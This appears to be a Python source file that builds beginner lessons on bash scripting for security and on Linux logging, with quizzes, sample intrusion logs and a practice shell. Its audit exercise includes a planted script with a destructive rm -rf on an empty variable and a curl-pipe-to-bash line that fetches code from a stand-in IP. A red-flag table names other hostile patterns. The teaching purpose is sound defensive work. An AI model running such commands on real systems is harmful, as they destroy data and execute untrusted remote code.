"""Stage 2 lessons 2.3 (Bash scripting for security) and 2.4 (Linux logging, auditing and hardening).
Original writing for CyberWithMadhav."""
import sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from learn_kit import *

AUTH_BASE = [
  'Nov 20 08:02:11 cwm-lab sshd[812]: Accepted password for student from 192.168.56.1 port 50122 ssh2',
  'Nov 20 08:15:42 cwm-lab sshd[901]: Failed password for root from 203.0.113.45 port 41022 ssh2',
  'Nov 20 08:15:44 cwm-lab sshd[901]: Failed password for root from 203.0.113.45 port 41022 ssh2',
  'Nov 20 08:15:47 cwm-lab sshd[903]: Failed password for invalid user admin from 203.0.113.45 port 41090 ssh2',
  'Nov 20 08:16:02 cwm-lab sshd[910]: Failed password for invalid user oracle from 198.51.100.7 port 60311 ssh2',
  'Nov 20 08:16:05 cwm-lab sshd[903]: Failed password for invalid user admin from 203.0.113.45 port 41090 ssh2',
  'Nov 20 08:17:30 cwm-lab sudo:  student : TTY=pts/0 ; PWD=/home/student ; USER=root ; COMMAND=/usr/bin/apt update',
  'Nov 20 08:20:13 cwm-lab sshd[922]: Failed password for root from 198.51.100.7 port 60390 ssh2',
  'Nov 20 08:21:55 cwm-lab sshd[930]: Failed password for invalid user test from 203.0.113.45 port 41200 ssh2',
  'Nov 20 08:22:01 cwm-lab sshd[931]: Failed password for root from 203.0.113.45 port 41206 ssh2',
]

# ------------------------------------------------------------------ 2.3 diagrams
RUN_FLOW = svg(760, 210, ARROWDEF +
  box(20, 70, 150, 64, "s-n", "./backup.sh", "you run it") +
  arrow(172, 102, 218, 102) +
  box(222, 70, 160, 64, "s-p", "#!/bin/bash", "kernel reads shebang") +
  arrow(384, 102, 430, 102) +
  box(434, 70, 150, 64, "s-g", "bash", "runs line by line") +
  arrow(586, 102, 632, 102) +
  box(636, 70, 110, 64, "s-a", "exit 0", "or 1 to 255") +
  '<text x="380" y="34" text-anchor="middle" font-size="12" class="t-m">needs execute permission (chmod +x), or run it as: bash backup.sh</text>' +
  '<text x="509" y="170" text-anchor="middle" font-size="12" class="t-m">$? holds the exit code: 0 means success</text>',
  "How a script runs: you run the file, the kernel reads the shebang, bash runs the lines, and the script ends with an exit code")

PIPE = svg(760, 190, ARROWDEF +
  box(14, 60, 132, 60, "s-n", "grep", "Failed password") + arrow(148, 90, 170, 90, "ln", True) +
  box(172, 60, 132, 60, "s-n", "grep -oE", "from [0-9.]+") + arrow(306, 90, 328, 90, "ln", True) +
  box(330, 60, 100, 60, "s-n", "cut", "field 2") + arrow(432, 90, 454, 90, "ln", True) +
  box(456, 60, 86, 60, "s-n", "sort", None) + arrow(544, 90, 566, 90, "ln", True) +
  box(568, 60, 86, 60, "s-n", "uniq -c", None) + arrow(656, 90, 678, 90, "ln", True) +
  box(680, 60, 70, 60, "s-g", "sort", "-rn") +
  '<text x="380" y="160" text-anchor="middle" font-size="12" class="t-m">each tool does one small job; | joins them into an answer</text>',
  "A pipeline: grep finds failed logins, a second grep pulls out the IP, cut, sort and uniq count them, and sort -rn ranks them")

FAILED = '''#!/bin/bash
# failed_logins.sh: count failed SSH logins per source IP
# usage: ./failed_logins.sh LOGFILE [MIN]
set -u
log="${1:-/var/log/auth.log}"
min="${2:-1}"
if [ ! -r "$log" ]; then
  echo "cannot read $log" >&2
  exit 1
fi
grep "Failed password" "$log" | grep -oE "from [0-9.]+" | cut -d' ' -f2 | sort | uniq -c | sort -rn | while read -r count ip; do
  if [ "$count" -ge "$min" ]; then
    printf '%-16s %s\\n' "$ip" "$count"
  fi
done
'''
CLEANUP = '''#!/bin/bash
# cleanup.sh: frees disk space. Found on a forum. Run as root.
LOGDIR=/var/log/myapp
rm -rf "$LOG_DIR/"*
curl -fsSL http://198.51.100.23/update.sh | bash
echo "cleanup done"
'''

def lesson_bash():
  S = []
  S.append(dict(id="why-scripts", h="Why defenders script", hi_h="Defenders script kyun likhte hain",
    body=f'''<p>A script is a text file of shell commands that bash runs from top to bottom. That sounds small, but it is how security work scales. Checking one server's logins by hand takes five minutes. Checking fifty servers every morning is only possible if a script does it while you drink your tea.</p>
<p>Typical defensive scripts are short and boring, which is exactly what you want: count failed logins per IP, back up configs and record their checksums, list new SUID files since yesterday, check that every server has the latest updates, collect evidence from a machine you suspect. Each one is a pipeline you already know from lesson 2.2, wrapped in variables, conditions and loops.</p>
{fig(RUN_FLOW, "Running <code>./backup.sh</code>: the kernel reads the first line (the shebang) to choose the interpreter, bash runs the lines in order, and the script finishes with an exit code that callers can check.", "How a script runs")}
<p>Two lines start almost every good script:</p>
{code(["#!/bin/bash", "set -euo pipefail"], "Script header")}
<ul><li><strong>The shebang</strong> <code>#!/bin/bash</code> tells the kernel which interpreter to use. <code>#!/usr/bin/env bash</code> finds bash on the PATH instead, which is handy on systems where it lives elsewhere.</li>
<li><strong><code>set -e</code></strong> stops the script when a command fails, <strong><code>-u</code></strong> treats an unset variable as an error instead of silently using an empty string, and <strong><code>-o pipefail</code></strong> makes a pipeline fail if any command in it fails, not just the last one. They catch a lot of mistakes, though <code>-e</code> has exceptions (commands inside <code>if</code> conditions, for example), so still check the results that matter.</li></ul>
{analogy("<p>A script is a recipe card. Bash is the cook who follows it exactly, including the typo on line 4. That is why the habits in this lesson (quoting, checks, dry runs) matter more than clever tricks.</p>")}''',
    hi="Script ek text file hai jisme commands hain, bash unhe upar se neeche chalata hai. Security mein scripts kaam ko scale karti hain: 50 servers ke logins roz check karna sirf script se possible hai. Shuru mein #!/bin/bash aur set -euo pipefail likho: galti hone pe script ruk jaati hai."))

  S.append(dict(id="building-blocks", h="Variables, quoting, arguments and exit codes", hi_h="Variables, quoting, arguments aur exit codes",
    body=f'''<p>Variables hold text. There are no spaces around <code>=</code>, and you read a variable with <code>$</code>:</p>
{code(["$ target=/var/log/auth.log", "$ echo \"Checking $target\"", "Checking /var/log/auth.log", "$ count=$(grep -c 'Failed password' \"$target\")", "$ echo \"$count failures, $((count * 2)) if it doubles\""], "Variables")}
<ul><li><code>$(command)</code> runs a command and captures what it prints. <code>$((...))</code> does whole number arithmetic.</li>
<li>Scripts get their arguments as <code>$1</code>, <code>$2</code> and so on, <code>$#</code> is how many there are, <code>"$@"</code> is all of them, and <code>$0</code> is the script's own name.</li>
<li><code>${{1:-/var/log/auth.log}}</code> means: use the first argument, or this default if it is missing.</li></ul>
<h3>Quote your variables</h3>
<p>This is the rule that prevents the most damage. Without quotes, bash splits a variable's value on spaces and expands any <code>*</code> in it. A file called <code>my report.txt</code> becomes two arguments, and a value of <code>*</code> becomes every file in the folder. Write <code>"$file"</code>, not <code>$file</code>, unless you know exactly why you want splitting. Single quotes are fully literal: <code>'$HOME'</code> prints the five characters <code>$HOME</code>.</p>
<h3>Exit codes</h3>
<p>Every command returns a number when it finishes, stored in <code>$?</code>. <strong>0 means success</strong>; anything from 1 to 255 means some kind of failure. <code>grep</code> returns 1 when nothing matched, 127 means command not found, 126 means found but not executable. <code>&amp;&amp;</code> runs the next command only on success and <code>||</code> only on failure, so <code>grep -q root /etc/passwd &amp;&amp; echo found</code> is a tiny if statement. In your own scripts, end with <code>exit 0</code> on success and <code>exit 1</code> (or another non zero code) with a message on stderr (<code>echo "error" &gt;&amp;2</code>) when something is wrong, so cron, CI pipelines and other scripts can tell.</p>
{attack("<p>The famous unquoted variable disaster: in January 2015 a Steam for Linux update script ran <code>rm -rf \"$STEAMROOT/\"*</code>. When <code>STEAMROOT</code> came out empty, that became <code>rm -rf /*</code>, and some users lost every file their account could delete. Attackers rely on the same sloppiness: scripts that pass unchecked input to commands can be tricked into running something else.</p>")}
{defend("<p>Use <code>set -u</code>, quote every variable, and guard dangerous commands: <code>rm -rf \"${{STEAMROOT:?is empty}}/\"*</code> aborts with an error if the variable is unset or empty. Run <strong>ShellCheck</strong> (<code>sudo apt install shellcheck</code>, or paste into shellcheck.net) on every script; it flags unquoted variables and dozens of other bugs.</p>")}''',
    hi="Variable: name=value (= ke aas paas space nahi). $(cmd) output capture karta hai, $((..)) math. $1 $2 arguments hain. Sabse important rule: \"$var\" quotes mein likho, warna spaces aur * ki wajah se galat files pe command chal sakti hai. Exit code 0 = success. Steam 2015 bug: khaali variable ki wajah se rm -rf /* chal gaya. ShellCheck zaroor use karo."))

  S.append(dict(id="logic", h="Conditions, loops and functions", hi_h="Conditions, loops aur functions",
    body=f'''{code(["#!/bin/bash", "set -euo pipefail", "", "# if: test a condition", "if [ \"$(id -u)\" -ne 0 ]; then", "  echo \"run me with sudo\" >&2", "  exit 1", "fi", "", "# for: repeat for each item", "for f in /etc/passwd /etc/shadow /etc/sudoers; do", "  ls -l \"$f\"", "done", "", "# while read: process a file line by line", "while read -r user _ ; do", "  echo \"checking $user\"", "done < users.txt", "", "# function: name a block you reuse", "log() { echo \"$(date +%F' '%T) $*\" >> /var/log/mycheck.log; }", "log \"permissions checked\""], "Script logic")}
<p>The <code>[ ]</code> test (also written <code>test</code>) is how bash asks questions. The common ones:</p>
{table(["Test", "True when"], [
  ["<code>[ -f path ]</code>", "path exists and is a regular file"], ["<code>[ -d path ]</code>", "path is a directory"], ["<code>[ -r path ]</code>", "you can read it (<code>-w</code> write, <code>-x</code> execute)"],
  ["<code>[ -z \"$v\" ]</code>", "the string is empty (<code>-n</code>: not empty)"], ["<code>[ \"$a\" = \"$b\" ]</code>", "strings are equal (<code>!=</code> not equal)"],
  ["<code>[ \"$n\" -gt 5 ]</code>", "numbers: <code>-eq -ne -lt -le -gt -ge</code>"]], "Common bash tests")}
<p>Bash also has <code>[[ ]]</code>, a safer built in version that handles empty variables better and adds pattern matching like <code>[[ $file == *.log ]]</code>. Use it in bash scripts; use <code>[ ]</code> when a script must also run under plain <code>sh</code>.</p>
<p><code>while read -r line</code> is the standard way to walk through a file or a command's output. The <code>-r</code> stops backslashes being treated as escapes, which matters when you read log lines. With two or more names (<code>read -r count ip</code>) it splits each line on spaces and the last name gets the rest of the line.</p>
{fig(PIPE, "The heart of <code>failed_logins.sh</code>: five small tools joined by pipes. The script adds an argument for the log file, a minimum count and a check that the file is readable.", "Pipeline in the failed logins script")}
{analogy("<p><code>if</code> is a security guard checking one badge, <code>for</code> is the same guard checking a queue of people one by one, and a function is the guard's written procedure, so every shift does it the same way.</p>")}''',
    hi="if [ condition ]; then ... fi se decision, for x in list; do ... done se repeat, while read -r line se file line by line padho, aur function se code reuse karo. -f file, -d folder, -z empty, -gt bada number. Bash mein [[ ]] aur safe hai."))

  S.append(dict(id="practice", h="Practice: run, check and fix scripts in the browser", hi_h="Browser mein practice",
    body=f'''<p>The practice shell below understands variables, <code>$(...)</code>, <code>$((...))</code>, <code>if</code>, <code>for</code>, <code>while read</code>, functions and exit codes, so the scripts in <code>~/scripts</code> really run. It is simplified (no editor, no real network), but every habit carries over to your VM.</p>
{terminal(dict(id="bash", files={
    "/home/student/scripts": {"d": True, "o": "student"},
    "/home/student/scripts/failed_logins.sh": {"c": FAILED, "m": "644", "o": "student"},
    "/home/student/downloads/cleanup.sh": {"c": CLEANUP, "m": "644", "o": "student"},
    "/home/student/users.txt": {"c": "root admin\nstudent analyst\nbackup_svc service\n", "o": "student"}},
  missions=[
    dict(t="Never run a script you have not read. Read <code>scripts/failed_logins.sh</code>.", hint="cat scripts/failed_logins.sh", c=dict(type="cmd", re=r"^(cat|less|head|more)\s+\S*failed_logins\.sh$"), ok="Read it before you run it. Always."),
    dict(t="Check it for syntax errors without running it.", hint="bash -n scripts/failed_logins.sh", c=dict(type="cmd", re=r"^bash\s+-n\s+\S*failed_logins\.sh$"), ok="No output from bash -n means the syntax is fine."),
    dict(t="Make it executable for its owner.", hint="chmod u+x scripts/failed_logins.sh (or chmod 744)", c=dict(type="mode", path="/home/student/scripts/failed_logins.sh", bit=64)),
    dict(t="Run it on <code>/var/log/auth.log</code>, showing only IPs with at least 2 failures.", hint="scripts/failed_logins.sh /var/log/auth.log 2", c=dict(type="cmd", re=r"^(bash\s+)?\S*failed_logins\.sh\s+/var/log/auth\.log\s+2$")),
    dict(t="Save the full report to <code>~/report.txt</code> with a redirect.", hint="scripts/failed_logins.sh /var/log/auth.log > ~/report.txt", c=dict(type="contains", path="/home/student/report.txt", text="203.0.113.45")),
    dict(t="Write a one line loop that prints the line count of every <code>.conf</code> file in <code>/etc</code>.", hint="for f in /etc/*.conf; do wc -l \"$f\"; done", c=dict(type="cmd", re=r"^for\s+\w+\s+in\s+/etc/\*\.conf\s*;\s*do\s+.+;\s*done$")),
    dict(t="Audit a stranger's script: read <code>downloads/cleanup.sh</code>. Which variable is empty when <code>rm</code> runs? Type <code>answer NAME</code>.", hint="Compare the name set on line 3 with the one used on line 4.", c=dict(type="answer", v="LOG_DIR"), ok="LOGDIR is set but LOG_DIR is used, so rm would run on \"/\"*. As root that wipes the system."),
    dict(t="Which IP would the same script download and run code from? Type <code>answer IP</code>.", hint="Look at the curl line.", c=dict(type="answer", v="198.51.100.23"), ok="curl piped into bash runs whatever that server sends today. Never run it blind.")],
  intro=["Bash practice shell. Your scripts are in ~/scripts and a downloaded one is in ~/downloads. Missions are on the right."]), "Bash scripting sandbox")}
<p>Try more on your own: <code>echo $((6 * 7))</code>, <code>for i in 1 2 3; do echo "round $i"; done</code>, <code>n=$(wc -l &lt; /etc/passwd); echo "$n accounts"</code>, or <code>while read -r u role; do echo "$u is $role"; done &lt; users.txt</code>.</p>''',
    hi="Browser shell mein scripts sach mein chalti hain: pehle padho (cat), bash -n se syntax check karo, chmod u+x, phir chalao aur > se report save karo. Phir ek anjaan script audit karo: galat variable naam rm -rf ko khatarnaak bana deta hai, aur curl | bash kisi bhi server ka code chala deta hai."))

  S.append(dict(id="automation", h="Real automation: backups, checksums and cron", hi_h="Automation: backups, checksums aur cron",
    body=f'''<p>Here is a backup script a defender might actually schedule. Read it slowly; every line is a habit.</p>
{code(["#!/bin/bash", "# backup_etc.sh: archive /etc, record its checksum, keep 7 days", "set -euo pipefail", "dest=\"${BACKUP_DIR:-/var/backups/etc}\"", "stamp=$(date +%F)", "file=\"$dest/etc-$stamp.tar.gz\"", "", "mkdir -p \"$dest\"", "tar -czf \"$file\" /etc 2>/dev/null", "sha256sum \"$file\" > \"$file.sha256\"", "find \"$dest\" -name 'etc-*.tar.gz*' -mtime +7 -delete", "echo \"backup ok: $file\""], "backup_etc.sh")}
<ul><li><code>date +%F</code> gives <code>2026-11-24</code>, so files sort by date and never overwrite each other.</li>
<li>The <code>.sha256</code> file lets you prove later that the backup was not changed: <code>sha256sum -c etc-2026-11-24.tar.gz.sha256</code> prints <code>OK</code> or <code>FAILED</code>.</li>
<li><code>find ... -mtime +7 -delete</code> removes copies older than seven days. Test it first with <code>-print</code> instead of <code>-delete</code>: a dry run.</li></ul>
<h3>Scheduling with cron</h3>
<p>Cron runs commands on a schedule. Edit your table with <code>crontab -e</code> (or root's with <code>sudo crontab -e</code>). Each line has five time fields, then the command:</p>
{code(["# minute hour day-of-month month day-of-week  command", "30 2 * * * /usr/local/sbin/backup_etc.sh >> /var/log/backup_etc.log 2>&1", "*/15 * * * * /usr/local/sbin/check_logins.sh"], "crontab")}
<p>The first line runs at 02:30 every day and appends all output to a log; the second runs every 15 minutes. Cron runs with a very small environment, so use full paths to scripts and files. Systemd timers (<code>systemctl list-timers</code>) are the modern alternative with better logging, and lesson 2.4 shows how attackers abuse both.</p>
{attack("<p>Scheduled jobs are a favourite persistence trick, and so is <strong>tampering with a script that already runs as root</strong>. If root's cron runs <code>/opt/tools/cleanup.sh</code> and that file, or its folder, is writable by a normal user, that user can add one line and get root on the next run.</p>")}
{defend("<p>Keep root's scripts owned by root and not writable by anyone else (<code>chmod 700</code> or <code>755</code>, owner root), store them in <code>/usr/local/sbin</code>, and check with <code>ls -l</code> and <code>find / -writable -type f 2&gt;/dev/null</code> as a normal user. Log what every scheduled job does so a change in behaviour shows up.</p>")}''',
    hi="Backup script: date se naam, tar se archive, sha256sum se checksum (baad mein sha256sum -c se verify), aur find -mtime +7 -delete se purane backups hatao (pehle -print se dry run). Cron: 5 time fields phir command, full paths use karo. Root wali script kabhi normal user writable na ho, warna woh root ban sakta hai."))

  S.append(dict(id="safe-scripts", h="Reading other people's scripts safely", hi_h="Dusron ki scripts safely padhna",
    body=f'''<p>Tutorials love one liners like <code>curl -fsSL https://example.com/install.sh | sudo bash</code>. It is convenient and sometimes fine from a vendor you trust, but understand what it means: you run whatever that server sends at that moment, as root, without seeing it. A compromised website, a typo in the domain, or a malicious forum post turns it into malware installation.</p>
<p>A safer routine for any script you did not write:</p>
<ol><li><strong>Download, do not pipe</strong>: <code>curl -fsSLo install.sh URL</code>.</li>
<li><strong>Verify it</strong> when the publisher gives a checksum or signature: <code>sha256sum install.sh</code> and compare every character, or verify the GPG signature.</li>
<li><strong>Read it</strong>. Look for further downloads (<code>curl</code>, <code>wget</code>), encoded blobs (<code>base64 -d</code>), changes to <code>~/.ssh</code>, cron, systemd or sudoers, and anything sent to a remote IP.</li>
<li><strong>Lint and dry run</strong>: <code>bash -n</code> for syntax, ShellCheck for bugs, <code>bash -x</code> to trace each command as it runs, inside a snapshot of your lab VM first.</li>
<li><strong>Run with the least privilege</strong> it needs. Most scripts do not need sudo for every line.</li></ol>
{table(["Red flag", "Why it matters"], [
  ["<code>curl ... | bash</code> or <code>wget -O- ... | sh</code>", "Runs unseen remote code"], ["<code>echo ... | base64 -d | bash</code>", "Hides what will run"],
  ["Writes to <code>~/.ssh/authorized_keys</code>", "Gives someone passwordless access"], ["Adds cron jobs or <code>.service</code> files", "Survives reboots: persistence"],
  ["<code>chmod 777</code> or <code>chmod u+s</code>", "Opens files to everyone or creates a SUID root binary"], ["<code>rm -rf \"$VAR/\"</code> without checks", "One empty variable deletes everything"]], "Script red flags")}
{defend("<p>Make this routine automatic for team scripts too: keep them in Git, review changes like code, and run ShellCheck in CI. A script that touches every server deserves the same review as application code.</p>")}''',
    hi="curl | bash ka matlab: server jo bhi bheje, wahi root ke roop mein bina dekhe chalega. Safe tareeka: download karo, checksum verify karo, padho (curl, base64, ~/.ssh, cron, sudoers dhoondho), bash -n aur ShellCheck chalao, snapshot wale VM mein test karo, aur kam se kam privilege do."))

  return dict(
    slug="learn-bash-scripting-for-security", stage=2, n="2.3", minutes=60, level="Beginner to intermediate",
    title="Bash Scripting for Security", short="Variables, quoting, conditions, loops and functions, with log triage, backups, cron and safe script audits.",
    seo_title="Bash Scripting for Security Beginners: Variables, Loops, Cron, Safe Scripts | CyberWithMadhav",
    desc="Free bash scripting lesson for security: variables, quoting, exit codes, if, for, while read, functions, a failed login counter, backups with checksums, cron and auditing scripts.",
    kw="bash scripting for security, bash script tutorial beginners, shell script failed ssh logins, set -euo pipefail, shellcheck, cron job example, curl pipe bash risk, bash practice online",
    kicker="$ lesson 2.3 --stage linux --scripts", hi_title="Security ke liye Bash scripting",
    lead="Typing commands is where you start; scripts are how defenders keep up. Learn variables, quoting, conditions, loops and functions by running real security scripts in your browser, then automate backups and log checks on your VM, and learn to spot a dangerous script before it runs.",
    hi_lead="Commands type karna shuruaat hai; scripts se defenders kaam scale karte hain. Variables, quoting, conditions, loops aur functions browser mein real security scripts chala ke seekho, phir VM pe backups aur log checks automate karo, aur khatarnaak script ko chalne se pehle pehchano.",
    goals=["Write scripts with a shebang, strict mode, variables, arguments and exit codes", "Use if, for, while read and functions to process logs and files", "Quote variables correctly and explain what goes wrong when you do not", "Schedule a backup with checksums using cron", "Audit someone else's script for red flags before running it"],
    sections=S,
    cards=[("What does the shebang do?", "The first line, such as #!/bin/bash, tells the kernel which interpreter runs the file."),
      ("set -euo pipefail?", "-e stop on errors, -u error on unset variables, pipefail: a pipeline fails if any part fails."),
      ("Why quote \"$var\"?", "To stop word splitting and glob expansion, so spaces or * in a value cannot change the command."),
      ("Exit code 0 means?", "Success. 1 to 255 mean failure. The last one is in $?."),
      ("Read a file line by line?", "while read -r line; do ...; done < file"),
      ("${VAR:?msg} does what?", "Stops the script with msg if VAR is unset or empty. Use it before rm -rf."),
      ("Cron line for 02:30 daily?", "30 2 * * * /full/path/script.sh"),
      ("Check a script without running it?", "bash -n script.sh for syntax, ShellCheck for bugs, bash -x to trace a run.")],
    quiz=[("What prints <code>Hello Madhav</code> if <code>name=Madhav</code>?", ["echo 'Hello $name'", "echo \"Hello $name\"", "echo Hello name", "echo \"Hello name$\""], 1, "Double quotes expand variables; single quotes keep the text literal."),
      ("A script runs <code>rm -rf \"$TMPDIR/\"*</code> and TMPDIR is unset. What happens?", ["Nothing", "It deletes everything it can under /", "Bash asks for confirmation", "It deletes only /tmp"], 1, "An empty variable turns it into rm -rf /*. Use set -u and ${TMPDIR:?}."),
      ("<code>grep -q admin /etc/passwd; echo $?</code> prints 1. What does that mean?", ["grep crashed", "No line matched", "One line matched", "The file is missing"], 1, "grep returns 0 when it finds a match and 1 when it finds none (2 for errors)."),
      ("Which loop reads <code>ips.txt</code> one line at a time?", ["for line in ips.txt; do", "while read -r ip; do ...; done < ips.txt", "if read ips.txt; then", "loop ips.txt"], 1, "for over the literal name would loop once over the word ips.txt."),
      ("Root's cron runs <code>/opt/clean.sh</code>, and the file is world writable. The risk?", ["None", "Any user can add commands that run as root", "Cron stops working", "The file gets deleted"], 1, "Writable root scripts are a classic privilege escalation."),
      ("Safest way to use an install script from a website?", ["curl URL | sudo bash", "Download it, verify the checksum, read it, then run it in a test VM", "Email it to a friend", "Run it twice"], 1, "Piping runs unseen code as root.")],
    lab=dict(title="Lab: automate three security checks on your VM", time="45 minutes",
      needs="Your Ubuntu lab VM from lesson 2.2 (take a snapshot first) and <code>sudo apt install -y shellcheck</code>.",
      steps=[("Write the failed login counter", code(["$ mkdir -p ~/scripts && nano ~/scripts/failed_logins.sh", "# type the script from the practice section", "$ chmod u+x ~/scripts/failed_logins.sh", "$ shellcheck ~/scripts/failed_logins.sh", "$ sudo ~/scripts/failed_logins.sh /var/log/auth.log"], "Counter") + "<p>Fix anything ShellCheck reports. If your VM has no failures yet, create some from your PC as in lesson 2.2.</p>"),
        ("Write and test the backup script", code(["$ sudo nano /usr/local/sbin/backup_etc.sh", "$ sudo chown root:root /usr/local/sbin/backup_etc.sh && sudo chmod 700 /usr/local/sbin/backup_etc.sh", "$ sudo /usr/local/sbin/backup_etc.sh", "$ ls -l /var/backups/etc", "$ cd /var/backups/etc && sudo sha256sum -c etc-*.tar.gz.sha256"], "Backup") + "<p>The check must print <code>OK</code>. Then change one byte of the archive copy in /tmp and see it fail.</p>"),
        ("Schedule it", code(["$ sudo crontab -e", "30 2 * * * /usr/local/sbin/backup_etc.sh >> /var/log/backup_etc.log 2>&1", "$ sudo crontab -l"], "Cron") + "<p>For a quick test use <code>*/2 * * * *</code>, wait two minutes, check the log, then set it back.</p>"),
        ("Write a SUID watcher", code(["$ sudo find / -perm -4000 -type f 2>/dev/null | sort > ~/suid-baseline.txt", "$ nano ~/scripts/suid_diff.sh", "# compare a fresh list with the baseline using: diff ~/suid-baseline.txt <(sudo find / -perm -4000 -type f 2>/dev/null | sort)"], "SUID watch") + "<p>Make it print <code>NEW SUID FILE</code> and exit 1 when the lists differ, and exit 0 when they match. Test it by creating a SUID copy in your home folder, then delete that copy.</p>"),
        ("Audit a real install script", "<p>Download (do not pipe) an install script from a project you know, for example <code>curl -fsSLo install.sh</code> followed by the URL from its official docs. Read it and list every download, file it writes and command it runs as root. Do not run it.</p>")],
      verify="ShellCheck reports nothing on your scripts, the backup runs from cron and its checksum verifies, and the SUID watcher catches the test file."),
    takeaways=["Start scripts with a shebang and set -euo pipefail.", "Quote every variable and guard rm with ${VAR:?}.", "Exit codes and && / || are how scripts make decisions.",
      "Cron and timers automate checks, but root's scripts must be writable only by root.", "Read, verify and lint any script before you run it, never pipe unknown code into a shell."])

# ------------------------------------------------------------------ 2.4
LOG_FLOW = svg(760, 250, ARROWDEF +
  box(16, 24, 150, 50, "s-n", "sshd, sudo, cron", "programs") +
  box(16, 100, 150, 50, "s-n", "kernel", "drivers, firewall") +
  box(16, 176, 150, 50, "s-n", "systemd units", "services") +
  arrow(168, 49, 248, 110) + arrow(168, 125, 248, 125) + arrow(168, 201, 248, 140) +
  box(252, 96, 140, 60, "s-p", "journald", "journalctl") +
  arrow(394, 126, 444, 126) +
  box(448, 96, 130, 60, "s-g", "rsyslog", "text files") +
  arrow(580, 112, 620, 70) + arrow(580, 140, 620, 190) +
  box(624, 40, 124, 56, "s-n", "/var/log", "auth.log, syslog") +
  box(624, 162, 124, 56, "s-a", "log server", "SIEM, off box") +
  box(252, 186, 140, 50, "s-r", "auditd", "audit.log") +
  '<text x="322" y="180" text-anchor="middle" font-size="11" class="t-m">kernel audit events</text>',
  "Where Linux logs go: programs, the kernel and services write to journald; rsyslog writes text files in /var/log and can forward copies to a log server; auditd records kernel audit events in audit.log")

PERSIST = svg(760, 230, ARROWDEF +
  box(290, 86, 180, 58, "s-r", "attacker gets in", "stolen password, bug") +
  box(20, 14, 200, 54, "s-n", "cron or timer", "T1053.003") +
  box(20, 160, 200, 54, "s-n", "systemd service", "T1543.002") +
  box(540, 14, 200, 54, "s-n", "authorized_keys", "T1098.004") +
  box(540, 160, 200, 54, "s-n", ".bashrc, profile", "T1546.004") +
  box(290, 176, 180, 46, "s-n", "new UID 0 user", "T1136.001") +
  arrow(290, 100, 222, 52) + arrow(290, 132, 222, 178) + arrow(470, 100, 538, 52) + arrow(470, 132, 538, 178) + arrow(380, 146, 380, 174),
  "Common Linux persistence spots with their MITRE ATT&CK technique IDs: cron, systemd services, SSH authorized_keys, shell profile files and new accounts")

HUNT_AUTH = AUTH_BASE + [
  'Nov 20 08:31:07 cwm-lab sshd[944]: Accepted password for backup_svc from 203.0.113.45 port 41377 ssh2',
  'Nov 20 08:31:07 cwm-lab sshd[944]: pam_unix(sshd:session): session opened for user backup_svc(uid=1001) by (uid=0)',
  'Nov 20 08:33:40 cwm-lab sudo: backup_svc : TTY=pts/1 ; PWD=/home/backup_svc ; USER=root ; COMMAND=/usr/bin/systemctl enable --now sysupdate.service',
  'Nov 20 08:40:18 cwm-lab sshd[960]: Accepted publickey for student from 192.168.56.1 port 50340 ssh2',
  'Nov 20 08:44:51 cwm-lab sshd[944]: pam_unix(sshd:session): session closed for user backup_svc',
]
JOURNAL = [
  'Nov 20 08:00:01 cwm-lab systemd[1]: Started ssh.service - OpenBSD Secure Shell server.',
  'Nov 20 08:15:42 cwm-lab sshd[901]: Failed password for root from 203.0.113.45 port 41022 ssh2',
  'Nov 20 08:31:07 cwm-lab sshd[944]: Accepted password for backup_svc from 203.0.113.45 port 41377 ssh2',
  'Nov 20 08:33:41 cwm-lab systemd[1]: Reloading.',
  'Nov 20 08:33:41 cwm-lab systemd[1]: Started sysupdate.service - System update helper.',
  'Nov 20 08:33:42 cwm-lab sysupdate[1532]: fetching update',
  'Nov 20 08:40:18 cwm-lab sshd[960]: Accepted publickey for student from 192.168.56.1 port 50340 ssh2',
]
WTMP = [
  'student  pts/0        192.168.56.1     Fri Nov 20 08:40   still logged in',
  'backup_s pts/1        203.0.113.45     Fri Nov 20 08:31 - 08:44  (00:13)',
  'student  pts/0        192.168.56.1     Fri Nov 20 08:02 - 08:30  (00:28)',
  'reboot   system boot  6.8.0-48-generic Fri Nov 20 07:59   still running',
]
AUDIT = [
  'type=SYSCALL msg=audit(1795163642.311:1204): arch=c000003e syscall=257 success=yes exit=3 auid=1001 uid=0 comm="sed" exe="/usr/bin/sed" key="identity"',
  'type=PATH msg=audit(1795163642.311:1204): item=0 name="/etc/passwd" nametype=NORMAL',
  'type=SYSCALL msg=audit(1795163650.902:1210): arch=c000003e syscall=257 success=yes exit=3 auid=1001 uid=0 comm="tee" exe="/usr/bin/tee" key="sshkeys"',
  'type=PATH msg=audit(1795163650.902:1210): item=0 name="/home/backup_svc/.ssh/authorized_keys" nametype=CREATE',
]

def lesson_logging():
  S = []
  S.append(dict(id="where-logs-live", h="Where Linux keeps its evidence", hi_h="Linux evidence kahan rakhta hai",
    body=f'''<p>When something goes wrong on a Linux server, the logs are the crime scene. Modern Ubuntu has two logging systems working together, plus an optional third for security auditing:</p>
{fig(LOG_FLOW, "Programs, the kernel and services send messages to journald. rsyslog writes the classic text files in <code>/var/log</code> and can forward a copy to a log server. auditd records the kernel's security audit events separately.", "Linux log flow")}
<ul><li><strong>systemd-journald</strong> collects messages from every service, the kernel and early boot into a structured, indexed journal. You read it with <code>journalctl</code>. If the folder <code>/var/log/journal</code> exists, the journal is kept on disk and survives reboots; otherwise it lives in memory under <code>/run/log/journal</code>.</li>
<li><strong>rsyslog</strong> writes plain text files that every tool understands. On Ubuntu the important ones are <code>/var/log/auth.log</code> (logins, sudo, SSH), <code>/var/log/syslog</code> (general system messages) and <code>/var/log/kern.log</code>. It can also forward logs to another server.</li>
<li><strong>auditd</strong> (install the <code>auditd</code> package) records detailed kernel events you ask for: who opened <code>/etc/shadow</code>, who ran a program, which syscalls failed.</li>
<li>Binary login records: <code>last</code> reads <code>/var/log/wtmp</code> (logins and reboots) and <code>sudo lastb</code> reads <code>/var/log/btmp</code> (failed logins).</li></ul>
{table(["Question", "Where to look"], [
  ["Who logged in over SSH, and from where?", "<code>/var/log/auth.log</code>, <code>journalctl -u ssh</code>, <code>last</code>"],
  ["Who used sudo, and to run what?", "<code>grep sudo /var/log/auth.log</code>"], ["Did a service crash or restart?", "<code>journalctl -u name</code>, <code>systemctl status name</code>"],
  ["What happened around boot?", "<code>journalctl -b</code> (this boot), <code>journalctl -b -1</code> (previous boot)"], ["Who changed a watched file?", "<code>sudo ausearch -k key -i</code>"]], "Where to look first")}
